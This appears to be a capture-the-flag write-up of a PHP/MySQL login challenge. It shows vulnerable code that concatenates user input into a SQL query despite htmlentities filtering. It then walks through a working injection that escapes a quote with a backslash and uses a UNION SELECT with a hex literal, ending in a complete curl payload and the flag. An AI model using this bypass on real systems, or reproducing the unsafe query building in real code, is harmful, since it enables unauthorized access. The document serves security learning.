# Login portal

> During our investigations, we've manage to find the [login portal](http://aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:50201/) for APOCALYSE members. Seems like all you have to do is login to get the flag, but it seems to be pretty damn secure since they actually filter user input and use password hashes. :(

Abbreviated version of attached `login.php`:

```php
$username = htmlentities($_POST["username"], ENT_QUOTES);
$agent_id = htmlentities($_POST["agent_id"], ENT_QUOTES);
$sql = "SELECT password FROM users WHERE username='$username' AND agent_id='$agent_id'";

$result = mysqli_query($conn, $sql);

$user = $result->fetch_row();

if ($user[0] === hash('sha256', $_POST["password"])) {
	echo getenv("FLAG");
} else {
	echo "Login Failed";
}
```

This is clearly an SQL injection attack, but with some mitigations.

The [`htmlentities`](https://www.php.net/manual/en/function.htmlentities.php) function, with `ENT_QUOTES` turns special characters like `'` into the corresponding HTML entity. For example,         `htmlentities("' or 1=1;--", ENT_QUOTES);` returns `&#039; or 1=1;--`, completely foiling our attack. We will need to use an alternative approach.

## Less is more

Sometimes, in SQL injection, we can try to disable some characters instead of adding them. This is especially useful in these kinds of challenges, where a filter prevents the use of `'`.

Let's see what happens when we set `username = \ ` and `agent_id =  abcd__   `  

```php
$sql = "SELECT password FROM users WHERE username='\' AND agent_id=' abcd__'";
// I shall replace \' with X to make it clearer
$sql = "SELECT password FROM users WHERE username='X AND agent_id=' abcd__'";
```

We have 'disabled' the closing quote character, turning it into a normal character with no special meaning as `\` is the escape character. When the query is executed, MySQL will read from the first `'`  at `username='` to the next quote at `agent_id='` and essentially interpret `'\' AND agent_id='` as a string. This leaves `$agent_id` unquoted, allowing us to execute an SQL injection attack!

## Union

In the next part of the challenge, we need to make the query return a value that's equal to the hash of `$_POST['password']`, which we control. The hash is compared using `===` so we can't just use magic hashes. Let's set `password = abcde`. Its corresponding hash is `36bbe50ed96841d10443bcb670d6554f0a34b761be67ec9c4a8ad2c0c44ca42c`. Now, we can unite these two parts using a union SQL injection.

```
username = \
password = abcde
agent_id = union select '36bbe50ed96841d10443bcb670d6554f0a34b761be67ec9c4a8ad2c0c44ca42c'--
```

But we come up against the constraint that quotes are not allowed. Fortunately, MySQL allows hex string literals. For example, `select 0x68656c6c6f20776f726c64;` will return `hello world`. If you don't believe me, you can try it in a MySQL console.

A quick script to convert a (byte) string to hex is `binascii`'s `b2a_hex`.

```python
from binascii import *
b2a_hex(b"hello world")
b'68656c6c6f20776f726c64'
```

Using this function, we can convert `36bbe50ed96841d10443bcb670d6554f0a34b761be67ec9c4a8ad2c0c44ca42c` to `0x33366262653530656439363834316431303434336263623637306436353534663061333462373631626536376563396334613861643263306334346361343263`, eliminating the need to use quotes. Thus the final attack is (copied curl from postman):

```
curl --location --request POST 'http://aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:50201/login.php' \
--form 'username="\\"' \
--form 'agent_id=" union select 0x33366262653530656439363834316431303434336263623637306436353534663061333462373631626536376563396334613861643263306334346361343263;#"' \
--form 'password="abcde"'
```

Flag: `Cyberthon{4p0c4lypt1c_w0rld_d00m1n4t1on}`



I made a mistake of omitting `_` in `agent_id` during the CTF. Note to self to be more careful next time.

